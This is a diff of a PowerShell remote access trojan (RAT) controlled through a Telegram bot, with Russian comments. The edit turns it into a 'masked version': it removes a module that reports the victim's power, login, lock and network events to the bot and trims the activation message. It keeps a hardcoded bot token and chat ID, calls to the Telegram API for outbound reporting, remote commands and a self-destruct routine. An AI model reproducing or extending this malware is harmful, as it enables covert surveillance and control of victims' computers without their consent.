@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - С МОНИТОРИНГОМ СОСТОЯНИЯ ПК
+# RAT через Telegram Bot - МАСКИРОВАННАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -129,83 +129,6 @@ function Compress-Folder {
         } catch {
             return $false
         }
-    }
-}
-
-# Функция мониторинга состояния системы
-function Start-SystemMonitor {
-    # Регистрируем события питания
-    $powerQuery = "SELECT * FROM Win32_PowerManagementEvent"
-    Register-WmiEvent -Query $powerQuery -Action {
-        $event = $EventArgs.NewEvent
-        $global:Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
-        $global:ChatID = "5674514050"
-        
-        function Quick-Send {
-            param([string]$Text)
-            $url = "https://api.telegram.org/bot$($global:Token)/sendMessage"
-            $body = @{chat_id = $global:ChatID; text = $Text}
-            try {
-                Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
-            } catch { }
-        }
-        
-        switch ($event.EventType) {
-            4 { Quick-Send "💤 Компьютер переходит в спящий режим" }
-            7 { Quick-Send "🔋 Компьютер вышел из спящего режима" }
-            10 { Quick-Send "⏻ Компьютер выключается" }
-            11 { Quick-Send "🔋 Компьютер вышел из гибернации" }
-            12 { Quick-Send "💤 Компьютер переходит в гибернацию" }
-            13 { Quick-Send "⚡ Обнаружено критическое выключение (потеря питания)" }
-            18 { Quick-Send "🔋 Работа от батареи" }
-            19 { Quick-Send "⚡ Работа от сети" }
-        }
-    } | Out-Null
-    
-    # Мониторинг сессии пользователя
-    $sessionQuery = "SELECT * FROM Win32_SessionChangeEvent"
-    Register-WmiEvent -Query $sessionQuery -Action {
-        $event = $EventArgs.NewEvent
-        $global:Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
-        $global:ChatID = "5674514050"
-        
-        function Quick-Send {
-            param([string]$Text)
-            $url = "https://api.telegram.org/bot$($global:Token)/sendMessage"
-            $body = @{chat_id = $global:ChatID; text = $Text}
-            try {
-                Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
-            } catch { }
-        }
-        
-        switch ($event.EventType) {
-            2 { Quick-Send "👤 Пользователь вошел в систему: $($event.SessionID)" }
-            3 { Quick-Send "🚪 Пользователь вышел из системы: $($event.SessionID)" }
-            4 { Quick-Send "🔒 Сессия заблокирована" }
-            5 { Quick-Send "🔓 Сессия разблокирована" }
-            7 { Quick-Send "👤 Контроль перехвачен (Remote Desktop)" }
-        }
-    } | Out-Null
-    
-    # Мониторинг сетевых подключений
-    $networkQuery = "SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus=2"
-    $lastNetworkState = $true
-    
-    while ($true) {
-        try {
-            $currentNetwork = Get-WmiObject -Query $networkQuery
-            $currentState = ($currentNetwork.Count -gt 0)
-            
-            if ($currentState -ne $lastNetworkState) {
-                if ($currentState) {
-                    Send-Telegram "🌐 Сетевое подключение восстановлено"
-                } else {
-                    Send-Telegram "❌ Сетевое подключение потеряно"
-                }
-                $lastNetworkState = $currentState
-            }
-        } catch { }
-        Start-Sleep -Seconds 30
     }
 }
 
@@ -362,14 +285,8 @@ try {
     Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
 } catch { }
 
-# Запускаем мониторинг системы в отдельном потоке
-Start-Job -ScriptBlock ${function:Start-SystemMonitor} -Name "SystemMonitor"
-
 # Отправка информации о запуске
-Send-Telegram "🟢 RAT активирован на $env:COMPUTERNAME
-💻 Пользователь: $env:USERNAME
-🕐 Время запуска: $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')
-
+Send-Telegram "RAT активирован на $env:COMPUTERNAME
 Доступные команды:
 /help - список команд
 /ls - список файлов
@@ -462,9 +379,6 @@ $($fileList -join "`n")"
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
-                                # Останавливаем мониторинг
-                                Get-Job -Name "SystemMonitor" | Remove-Job -Force
-                                
                                 # Запускаем встроенную функцию очистки
                                 $cleanupResult = Invoke-Cleanup
                                 
